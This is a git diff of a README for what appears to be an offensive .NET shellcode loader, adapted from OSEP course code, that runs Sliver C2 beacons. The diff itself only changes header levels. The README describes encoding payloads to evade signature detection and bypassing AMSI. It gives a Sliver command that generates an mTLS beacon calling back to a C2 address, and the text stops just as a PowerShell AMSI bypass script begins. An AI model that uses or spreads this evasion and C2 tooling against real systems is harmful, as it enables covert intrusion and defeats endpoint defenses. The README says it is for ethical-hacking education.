@@ -5,7 +5,7 @@ There is nothing special going on here; these are super basic methods.
 ## Introduction
 This is a Digital Honk Project that illustrates cybersecurity techniques within Windows environments, showcasing shellcode execution from an embedded resource. A standout feature is its use of encoded payloads, which focus on evading detection through custom encoding schemes and AMSI bypass techniques. As the creator of the Payload-Encoder and an advocate for educational purposes, this project aims to deepen the understanding of cyber security mechanisms and ethical hacking practices. This is modified code from the OSEP course to execute Sliver Payloads.
 
-### Key Features
+## Key Features
 - Shellcode execution from embedded resources in .NET applications.
 - Custom payload encoding schemes are used to evade signature-based detection.
 - Implementation of AMSI bypass techniques for unrestricted payload execution.
@@ -13,12 +13,12 @@ This is a Digital Honk Project that illustrates cybersecurity techniques within 
 
 ## Getting Started
 
-### Prerequisites
+## Prerequisites
 - A Windows environment (Windows 10/11 recommended).
 - .NET Framework 4.7.2 or later.
 - Visual Studio 2019 or later for development and compilation.
 
-### Setup
+## Setup
 1. **Generate Payload**: Use the Sliver C2 framework to generate your shellcode payload:
 ```
 sliver> generate --mtls 192.168.45.221:8888 --os windows --arch amd64 --format shellcode --save beacon.bin
@@ -27,7 +27,7 @@ sliver> generate --mtls 192.168.45.221:8888 --os windows --arch amd64 --format s
 The process is detailed at Payload-Encoder.
 3. **Embed and Compile**: Include the encoded payload (`honk.user.dat`) as an embedded resource and compile the project using Visual Studio.
 
-### Execution with AMSI Bypass
+## Execution with AMSI Bypass
 To execute the payload with an AMSI bypass, use the following PowerShell script, ensuring your environment permits script execution:
 ```powershell
 try{
